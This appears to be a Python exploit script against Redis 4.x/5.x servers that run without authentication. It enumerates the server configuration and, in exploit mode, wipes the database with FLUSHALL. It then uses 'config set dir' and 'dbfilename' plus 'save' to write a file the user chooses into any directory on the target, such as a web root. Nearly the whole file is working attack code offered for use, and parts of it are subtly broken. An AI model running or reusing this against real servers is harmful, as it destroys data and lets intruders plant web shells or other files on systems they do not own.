#!/usr/bin/env python3
#################################################################### R00GHIZ #################################################################################
##############################################################################################################################################################
##############################################################################################################################################################

import os
from sys import argv
from termcolor import colored
import argparse, sys, socket,struct
import subprocess

def args():
    parser = argparse.ArgumentParser(description='Redis 4.x/5.x Write a file into the box running the Redis server without authentication  ')
    parser.add_argument("-a", "--action", dest="action", type=str, help="type of action (enum|exploit) by default action=enum", default="enum")
    parser.add_argument("-r", "--rhost", dest="rhost", type=str, help="target host", required=True)
    parser.add_argument("-p", "--rport", dest="rport", type=int,
                        help="target redis port, default 6379", default=6379)
    parser.add_argument("-f", "--file", type=str, help="file to write in the redis server")
    parser.add_argument("-d", "--path", type=str, help="The Path to the directory where we want to write the file in redis server, '/var/www/html/' per example")
    parser.add_argument("-n", "--name", type=str, help="The name of the file to write in the redis server")
    options = parser.parse_args()
    return options

def redis_auth(options):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((options.rhost, options.rport))
    s.send('echo "Hey no AUTH required!"\n')
    recu=s.recv(1024)
    s.close()
    if "$21" in recu:  
       return True
    return False
    
 
def enum_server(options):
   print(colored('*******************************************************************', "green"))
   if redis_auth(options):
      print(colored('* [+] [Enumeration] ' ,"green"))
      print(colored('* [+] [Enumeration of the Redis server] ' ,"green"))
      cmd = "redis-cli -h " + str(options.rhost) + " -p "+str(options.rport) +  ' config get \* '
      os.system(cmd)
   else:
       print(colored('s* [+] [Failed] Redis server require authentication', "red"))

def exploit(options):
   etat=True
   print(colored('\t*********************************************************************', "green"))
   if redis_auth(args):
        print(colored('* [+] [Exploit] The Authentication to redis server is not required **' ,"green")      )
        print(colored('* [+] [Exploit] Exploiting misconfigured REDIS SERVER ***************' ,"green"))
        print("\n")
        print(colored("* [+] [Exploit] Writing the file in the redis server ***********", "blue"))
        cmd0 = '(echo -e "\n\n"; cat '+args.file+'; echo -e "\n\n") > /tmp/redis_r00ghiz.txt'
        cmd = "redis-cli -h " + str(args.rhost) + " -p "+str(args.rport)+" flushall"
        cmd1 = "redis-cli -h " + str(args.rhost) + " -p "+str(args.rport)
        os.system(cmd0)
        os.system(cmd)
        cmd2 = "cat /tmp/redis_r00ghiz.txt | redis-cli -h " +  str(args.rhost) + " -p "+str(args.rport)+ ' -x set cracklist'
        os.system(cmd2)
        
        cmd3 = cmd1 + ' config set  dir ' + args.path 
        cmd4 = cmd1 + ' config get dir '
        cmd5 = cmd1 + ' config set dbfilename "'+args.name+'" '
        cmd6 = cmd1 + ' save'
        try:
           out=subprocess.check_output(cmd3, shell=True, stderr=subprocess.STDOUT) 
           print(out)
           if 'OK' not in out:
             etat = etat*False
           out=subprocess.check_output(cmd4, shell=True, stderr=subprocess.STDOUT).replace('\n', '').strip("dir")
           if out == args.path[:-1]:
              print("Change to directory %s success"% args.path)
           else:
              etat = etat*False
           out=subprocess.check_output(cmd5, shell=True, stderr=subprocess.STDOUT)
           print(out)
           if 'OK' not in out:
             etat = etat*False
             print('not save')
           print("\n")
           out=subprocess.check_output(cmd6, shell=True, stderr=subprocess.STDOUT)
           print(out)
           if 'OK' not in out:
             etat = etat*False
             print("Can't save the file in the path: %s%s\n"%(args.path,args.name))
           elif etat:
             print('File saved\n')
        except subprocess.CalledProcessError as e:
           print(e.output)
        if etat :
           print(colored('* [+] [Exploit] Exploit success !' ,"green")  )
        else:
           print(colored('* [+] [Exploit] Exploit failed' ,"red"))
   else:
      print(colored('* [+] [Exploit Failed] Redis server require authentication *******', "red"))
        

args =args()
if args.action == "enum":
   enum_server(args)
else:
   if os.path.isfile(args.file):
     exploit(args)
   else:
     print(colored('\n* [+] [Verification] File '+args.file+' Not exist !' ,"red"))

